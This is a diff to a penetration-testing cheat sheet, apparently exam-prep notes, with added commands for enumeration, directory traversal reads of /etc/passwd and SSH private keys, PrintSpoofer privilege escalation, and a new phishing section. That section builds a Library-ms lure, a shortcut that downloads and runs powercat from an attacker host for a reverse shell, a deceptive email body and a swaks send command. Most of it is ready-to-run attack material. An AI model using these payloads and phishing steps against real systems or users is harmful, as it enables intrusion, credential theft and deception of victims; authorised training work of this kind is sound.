@@ -16,7 +16,7 @@ nmap -p21,22,80,139,443,445,... -sC -sV -A -T4 $rhost
 
 ## TCP
 
-### ftp
+### 21 - ftp
 
 ```
 nmap -p21 --script=ftp-vuln* -A -T4 -sV $rhost
@@ -48,7 +48,7 @@ wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
 ```
 
-### smb
+### 135,445 - smb
 
 Enumeration via enum4linux:
 ```
@@ -76,10 +76,15 @@ smbclient \\\\$ip\\share [-U username -P password]
 ```
 crackmapexec smb -u username -p password $ip --shares
 ```
+
 ## UDP
 
 ## Web services
 
+Use whatweb to check some information about the webpage:
+```
+whatweb http://www.webpage.com
+```
 NOTE: If you should try to find vhost ou subdomains, remember to add website fqdn to /etc/hosts
 ### nikto
 ```
@@ -252,6 +257,11 @@ Users enumeration
 ```
 wpscan --url www.example.com --enumerate u
 ```
+
+Example with plugin enumeration (aggressive  mode) and output a wpscan file:
+```
+wpscan --url http://www.example.com --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+```
 ###### Reverse Shell 
 You can reverse shell by editing templates (404.php, footer.php...)
 #### Joomla!
@@ -328,23 +338,21 @@ Example:
 
 File /etc/passwd via Directory Traversal
 ```
-http://domain.com/meteor/index.php?page=../../../../../../../../../etc/passw
-d
+http://domain.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 ```
-with user information (/bin/bash or /bin/sh), we can try to get the ssh key
+with user information (/bin/bash or /bin/sh), we can try to get the ssh key.
 
 ssh key via Directory Traversal:
 ```
-http://domain.com/meteor/index.php?page=../../../../../../../../../home/offs
-ec/.ssh/id_rsa
+http://domain.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
 ```
 
 Via curl:
 ```
 curl
-http://domain.com/meteor/index.php?page=../../../../../../../../../home/offs
-ec/.ssh/id_rsa
+http://domain.com/meteor/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
 ```
+NOTE: try also to find other types of keys like ECDSA with id_ecdsa.
 
 #### Different Encoding
 
@@ -1202,6 +1210,76 @@ With this, impacket will try to relay our hash to other machine with ip is `serv
 
 ## Client Side Attack
 
+### Mail Server
+
+Get some credentials and try to use it as phishing attack
+
+Setting up a webdav share and put your phishing file in webdab dir (config.Library-ms and the reverse shell shortcut):
+```
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/
+```
+
+Use Visual Studio to save the config.Library-ms file:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://changeheretoyourip</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+NOTE: changeheretoyourip should be your webdav ip, which in this case is your machine tun0 interface ip.
+
+Windows shortcut (in Desktop, select New > Shortcut) should be:
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:$webport/powercat.ps1'); powercat -c $lhost -p $lport -e powershell"
+```
+
+Copy to a another directory powercat script and set up a web server to it:
+```
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+```
+
+Remeber, this is only for the powercat.ps1
+```
+python3 -m http.server $webport
+```
+
+Set up your nc listener for the reverse shell:
+```
+nc -nlvp $lport
+```
+
+Make a body.txt to send to the users in the mail server:
+```
+Hey!
+I checked this MACHINE and discovered that the previously used staging script still exists in the Git logs.
+I'll remove it for security reasons.
+On an unrelated note, please install the new security features on your workstation.
+For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
+John
+```
+
+Using swaks to send the email:
+```
+sudo swaks -t username1@mailserver.com -t user2@mailserver.com --from john@mailserver.com --attach @config.Library-ms --server $mailserver_ip --body @body.txt --header "Subject: Git Vulnerability" --suppress-data -ap
+```
+You will be asked for a login. Enter the credentials founded and send the e-mail.
+
+
 ## Pivoting
 
 ### SSH Local Port Forwarding
@@ -1302,6 +1380,7 @@ netstat -ano
 ```
 
 We can query two registry keys756 to list both 32-bit and 64-bit applications in the Windows Registry:
+
 For 32-bit:
 ```
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
@@ -1435,6 +1514,10 @@ From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Wind
 .\PrintSpoofer64.exe -c "C:\path\to\nc.exe $lhost $lport -e cmd"
 ```
 
+```
+.\PrintSpoofer64.exe -i -c powershell.exe
+```
+
 Releases [link](https://github.com/itm4n/PrintSpoofer/releases).
 
 ##### [GodPotato](https://github.com/BeichenDream/GodPotato)
@@ -1489,8 +1572,21 @@ iwr -uri http://$lhost:$lport/file.ext -OutFile file.ext
 Invoke-WebRequest "http://$lhost:$lport/file.ext" -OutFile "file.ext"
 ```
 
-## Linux
+### SMB
 
+Copy files from Kali to Windows:
+```
+copy \\$lhost\sharename\file.ext file.ext
+```
+
+Copy file from Windows to Kali:
+```
+copy file.ext \\$lhost\sharename\file.ext
+```
+
+
+## Linux
+S
 ```
 wget http://$lhost:$lport/file.ext
 curl http://$lhost:$lport/file.ext -o /path/to/file.ext
